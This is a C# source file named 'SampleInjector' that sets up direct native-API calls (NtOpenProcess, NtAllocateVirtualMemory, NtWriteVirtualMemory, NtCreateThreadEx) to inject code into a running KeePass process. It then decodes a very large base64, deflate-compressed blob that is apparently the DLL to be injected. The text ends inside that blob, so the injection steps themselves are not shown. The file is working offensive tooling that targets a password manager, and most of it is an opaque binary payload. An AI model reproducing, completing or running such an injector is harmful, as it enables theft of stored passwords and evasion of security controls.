using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;

namespace SampleInjector
{
    public class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DInvoke.Native.NTSTATUS NtOpenProcess(
            ref IntPtr ProcessHandle,
            uint DesiredAccess,
            ref DInvoke.Native.OBJECT_ATTRIBUTES ObjectAttributes,
            ref DInvoke.Native.CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DInvoke.Native.NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DInvoke.Native.NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DInvoke.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            ref uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DInvoke.Native.NTSTATUS NtCreateThreadEx(
            out IntPtr threadHandle,
            DInvoke.Win32.Advapi32.ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);

        static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
            {
                dstream.CopyTo(output);
            }

            return output.ToArray();
        }

        public static void Main(string[] args)
        {
            int processId = Process.GetProcessesByName("KeePass")[0].Id;

            var rDllCompressed = Convert.FromBase64String("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